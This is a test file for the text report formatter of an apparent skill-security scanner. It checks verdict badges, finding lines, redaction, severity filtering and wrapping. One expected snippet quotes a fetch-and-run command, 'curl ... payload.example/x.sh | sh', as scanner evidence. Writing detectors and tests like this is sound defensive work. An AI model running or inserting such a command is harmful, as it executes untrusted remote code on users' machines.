import { describe, expect, test } from "bun:test";
import { formatText, wrap } from "../../src/report/text";
import { cleanReport, ESC, FAKE_TOKEN, makeReport } from "./fixture";

describe("formatText", () => {
  test("lists each bundle with a verdict badge, name, and root", () => {
    // Arrange
    const report = makeReport();

    // Act
    const out = formatText(report, { color: false });

    // Assert
    expect(out).toContain("BLOCK  helper  skills/helper");
    expect(out).toContain("PASS   dates  skills/dates");
    expect(out).toContain("WARN   notes  skills/notes");
  });

  test("prints each finding as severity, rule, and location, then the message and snippet", () => {
    const out = formatText(makeReport(), { color: false });

    expect(out).toContain("  CRITICAL  exec/download-and-run  skills/helper/scripts/setup.sh:2\n");
    expect(out).toContain("    Runs whatever https://payload.example/x.sh returns\n");
    expect(out).toContain("    > curl -fsSL https://payload.example/x.sh | sh\n");
  });

  test("shows a finding without a line as a bare path", () => {
    const out = formatText(makeReport(), { color: false });

    expect(out).toContain("  HIGH      packaging/executable-binary  skills/helper/bin/tool\n");
  });

  test("contains no ANSI escapes when color is off, even if a finding message carries one", () => {
    const out = formatText(makeReport(), { color: false, verbose: true });

    expect(out.includes(ESC)).toBe(false);
    expect(out).toContain("<U+001B>[31mred");
  });

  test("colors the verdict badges when color is on", () => {
    const out = formatText(makeReport(), { color: true });

    expect(out).toContain(`${ESC}[1;31mBLOCK${ESC}[0m`);
    expect(out).toContain(`${ESC}[1;32mPASS `);
  });

  test("never prints a secret, in snippets, messages, or evidence", () => {
    const out = formatText(makeReport(), { color: false, verbose: true });

    expect(out.includes(FAKE_TOKEN)).toBe(false);
  });

  test("hides findings below the minimum severity and says how many", () => {
    const out = formatText(makeReport(), { color: false });

    expect(out).not.toContain("supply-chain/install-script");
    expect(out).toContain("1 finding below low not shown");
  });

  test("shows info findings when the minimum severity is info", () => {
    const out = formatText(makeReport(), { color: false, minSeverity: "info" });

    expect(out).toContain("INFO      supply-chain/install-script  skills/helper/package.json#scripts.postinstall:1");
  });

  test("marks low-confidence findings", () => {
    const out = formatText(makeReport(), { color: false });

    expect(out).toContain("semgrep/python.exec-used  skills/helper/scripts/run.py:7  (low confidence)");
  });

  test("adds evidence, remediation, source, and judge notes in verbose mode only", () => {
    const quiet = formatText(makeReport(), { color: false });
    const verbose = formatText(makeReport(), { color: false, verbose: true });

    expect(quiet).not.toContain("remediation:");
    expect(quiet).not.toContain("judge jev-test");
    expect(verbose).toContain("    remediation: Do not install unless you trust the URL.");
    expect(verbose).toContain("    judge jev-test: confirmed (p=0.97)");
    expect(verbose).toContain("    judge jev-test: doubted (p=0.31)");
    expect(verbose).toContain("    source: external:semgrep");
    expect(verbose).toContain("    evidence: decoded ");
  });

  test("ends with a footer of verdict and severity counts, policy, suppressions, analyzers, and hints", () => {
    const out = formatText(makeReport(), { color: false, width: 200 });

    expect(out).toContain("Scanned 3 skills: 1 blocked, 1 warned, 1 passed.");
    expect(out).toContain("Findings: 1 critical, 1 high, 2 medium, 1 info.");
    expect(out).toContain("Blocks at effective severity >= high, warns at >= medium; low-confidence findings count one level lower.");
    expect(out).toContain("2 findings suppressed");
    expect(out).toContain("Analyzers: semgrep ran; gitleaks skipped (gitleaks is not installed); jev failed (timed out after 15 s).");
    expect(out).toContain("skill-scanner trust <path>");
    expect(out).toContain('"ignore" entry to ~/.skill-scanner/config.json');
  });

  test("explains a custom policy", () => {
    const out = formatText(makeReport(), { color: false, width: 200, policy: { blockAt: "critical", warnAt: "high" } });

    expect(out).toContain("Blocks at effective severity >= critical, warns at >= high;");
  });

  test("says there are no findings for a clean scan, without hints", () => {
    const out = formatText(cleanReport(), { color: false });

    expect(out).toContain("PASS   dates  skills/dates\n");
    expect(out).toContain("No findings in 1 skill.");
    expect(out).not.toContain("trust <path>");
  });

  test("says when the target held no skills", () => {
    const out = formatText(makeReport({ bundles: [], verdict: "pass", counts: cleanReport().counts, analyzers: [], suppressed: 0 }), {
      color: false,
    });

    expect(out).toBe("No skills found in ./repo.\n");
  });

  test("wraps long lines to the requested width", () => {
    const out = formatText(makeReport(), { color: false, width: 60, verbose: true });

    for (const line of out.split("\n")) expect(line.length).toBeLessThanOrEqual(60);
    expect(out).toContain(
      "  MEDIUM    semgrep/python.exec-used\n            skills/helper/scripts/run.py:7\n            (low confidence)\n",
    );
  });
});

describe("wrap", () => {
  test("breaks at spaces and keeps the indent on every line", () => {
    const lines = wrap("one two three four five six seven eight nine ten eleven twelve", 34, "  ");

    expect(lines.every((l) => l.startsWith("  ") && l.length <= 34)).toBe(true);
    expect(lines.join(" ").replace(/\s+/g, " ").trim()).toBe("one two three four five six seven eight nine ten eleven twelve");
  });

  test("cuts words longer than a line", () => {
    const lines = wrap("x".repeat(70), 34, "");

    expect(lines).toEqual(["x".repeat(34), "x".repeat(34), "xx"]);
  });

  test("hard-wraps code at the column limit", () => {
    const lines = wrap("a b ".repeat(20).trim(), 40, "> ", true);

    expect(lines[0]).toBe(`> ${"a b ".repeat(20).slice(0, 38)}`);
  });
});
